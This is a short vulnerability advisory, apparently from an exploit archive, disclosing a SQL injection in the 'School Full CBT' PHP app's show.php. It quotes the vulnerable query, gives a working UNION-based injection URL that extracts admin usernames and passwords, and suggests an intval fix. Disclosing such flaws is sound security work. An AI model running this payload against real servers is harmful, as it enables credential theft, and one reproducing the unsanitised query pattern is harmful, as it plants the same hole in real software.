@@ -1,0 +1,45 @@
+# Exploit Title.............. School Full CBT SQL Injection
+# Google Dork................ N/A
+# Date....................... 14/10/2016
+# Exploit Author............. lahilote
+# Vendor Homepage............ http://www.sourcecodester.com/node/9859
+# Software Link.............. http://www.sourcecodester.com/sites/default/files/download/fimo4real1992/cbt_by_ajijola_femi.zip
+# Version.................... 0.1
+# Tested on.................. xampp
+# CVE........................ N/A
+
+
+The audit_list in /show.php
+-------------------------------
+
+----snip----
+
+$get = $_GET['show'];
+	$result= mysql_query("select * from studentreg WHERE id=$get")or die(mysql_error());
+
+----snip----
+
+
+Example exploitation
+--------------------
+
+http://server/path_to_webapp/show.php?show=-1%20union%20select%201,username,password,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,user(),database(),31,32%20from%20adminlogin--+
+
+
+How to fix
+----------
+Simple method's use the php function intval.
+For example
+
+$get = intval($_GET['show']);
+	$result= mysql_query("select * from studentreg WHERE id=$get")or die(mysql_error());
+
+
+Credits
+-------
+This vulnerability was discovered and researched by lahilote
+
+References
+----------
+http://www.sourcecodester.com/node/9859
+http://php.net/manual/en/function.intval.php
